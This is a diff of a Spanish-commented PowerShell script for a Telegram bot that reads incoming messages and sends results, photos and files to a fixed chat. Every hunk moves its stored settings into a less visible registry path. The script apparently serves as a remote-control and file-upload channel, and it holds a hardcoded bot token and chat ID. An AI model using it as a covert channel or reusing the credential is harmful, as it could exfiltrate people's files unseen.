@@ -2,7 +2,7 @@
 ## Confiuración del Bot
 #########################################
 function New-MyTelegramConfiguration{
-    $RegKey = "HKCU:\Software\MyTelegram"
+    $RegKey = "HKCU:\Software\classes\MyTelegram"
     New-Item -Path $RegKey -Force | Out-Null
     New-ItemProperty $RegKey -Name 'BotKey' -Value "1572077157:AAHg8ChqgDgiJl092Ydz0q6AgNFSJQoHQik" -Force | Out-Null
     New-ItemProperty $RegKey -Name 'ChatID' -Value "685749607" -Force | Out-Null
@@ -13,7 +13,7 @@ function New-MyTelegramConfiguration{
 function Get-TelegramTimeLine{
     param([int]$MaxinumMessages)
 
-    $RegKey = "HKCU:\Software\MyTelegram"
+    $RegKey = "HKCU:\Software\classes\MyTelegram"
     $botkey = (Get-ItemProperty -Path $RegKey).BotKey
     $lastUpdate = (Get-ItemProperty -Path $RegKey).LastUpdateID
     $telegrams = (Invoke-WebRequest -Uri "https://api.telegram.org/bot$BotKey/getUpdates?offset=$lastUpdate" -UseBasicParsing).content
@@ -35,7 +35,7 @@ function Send-Results{
      param([string]$chat_id,
            [string]$texto)
 
-     $RegKey = "HKCU:\Software\MyTelegram"
+     $RegKey = "HKCU:\Software\classes\MyTelegram"
      $BotKey = (Get-ItemProperty -Path $RegKey).botkey
      Invoke-Webrequest -uri "https://api.telegram.org/bot$BotKey/sendMessage?chat_id=$chat_id&text=$texto" -Method post -UseBasicParsing| Out-Null
 }
@@ -44,7 +44,7 @@ function Send-Results{
 function Send-Photo{
     param([String]$File)
 
-    $RegKey = "HKCU:\Software\MyTelegram"
+    $RegKey = "HKCU:\Software\classes\MyTelegram"
     $BotKey = (Get-ItemProperty -Path $RegKey).Botkey
     $chat_id = (Get-ItemProperty -Path $RegKey).ChatID   
     $uri = "https://api.telegram.org/bot$BotKey/sendPhoto"
@@ -69,7 +69,7 @@ function Send-Photo{
 function Send-Document{
     param([String]$File)
 
-    $RegKey = "HKCU:\Software\MyTelegram"
+    $RegKey = "HKCU:\Software\classes\MyTelegram"
     $BotKey = (Get-ItemProperty -Path $RegKey).Botkey
     $chat_id = (Get-ItemProperty -Path $RegKey).ChatID
 
@@ -94,7 +94,7 @@ function Send-Document{
 
 # Obtiene el último Telegram leido
 function Get-LastUpdateID{
-    $RegKey = "HKCU:\Software\MyTelegram"
+    $RegKey = "HKCU:\Software\classes\MyTelegram"
     return (Get-ItemProperty -Path $RegKey).LastUpdateID
 }
 
@@ -102,7 +102,7 @@ function Get-LastUpdateID{
 function Update-Time{
     param([string]$LastUpdateID)
     $LastUpdateID
-    $RegKey = "HKCU:\Software\MyTelegram"
+    $RegKey = "HKCU:\Software\classes\MyTelegram"
     New-ItemProperty $RegKey -Name 'LastUpdateID' -Value $LastUpdateID -Force | Out-Null
 }
 
